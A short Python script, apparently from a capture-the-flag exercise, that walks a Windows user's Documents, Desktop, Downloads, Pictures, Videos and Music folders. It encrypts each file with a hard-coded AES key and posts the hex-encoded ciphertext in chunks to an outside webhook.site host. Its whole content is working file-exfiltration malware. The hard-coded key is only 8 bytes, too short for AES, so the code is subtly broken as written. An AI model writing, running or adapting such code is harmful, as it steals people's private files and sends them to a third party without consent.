# 1. read %userprofile% Documents, Desktop, Downloads, Pictures, Videos, Music
# 2. encrypt the files with AES, key is ff3dae3bccef1244 iv is taken rand with seed taken from timestamp of now, the cttext is encoded as base64
# 3. the resulted base 64 is sent as hex stream by splitting it into 128 byte chunk through network using post to http://0x00.webhook.site/?data={hexstream}

import os
import base64
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

AES_KEY = b'\xff\x3d\xae\x3b\xcc\xef\x12\x44'
timestamp = int(datetime.now().timestamp())
IV = timestamp.to_bytes(16, byteorder='big')

dirs = ['Documents', 'Desktop', 'Downloads', 'Pictures', 'Videos', 'Music']
base_path = os.path.expandvars(r'%USERPROFILE%')

def procFile(file_path):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        ct = AES.new(AES_KEY, AES.MODE_CBC, IV)
        datas = ct.encrypt(pad(data, AES.block_size))
        
        encDatas = base64.b64encode(datas)

        stream_datas = encDatas.hex()
        chunks = [stream_datas[i:i+256] for i in range(0, len(stream_datas), 256)]
        
        for chunk in chunks:
            url = f'http://0x00.webhook.site/?data={chunk}'
            requests.post(url)
        
        print(f"{file_path}")
        print("Checkpoint 2: Y2hhbGxfc2ltcGxlXw==")
    except Exception as e:
        print(f"{file_path}: {e}")

def procDir():
    for dir_name in dirs:
        dir_path = os.path.join(base_path, dir_name)
        if os.path.exists(dir_path):
            for root, _, files in os.walk(dir_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    procFile(file_path)

if __name__ == "__main__":
    procDir()
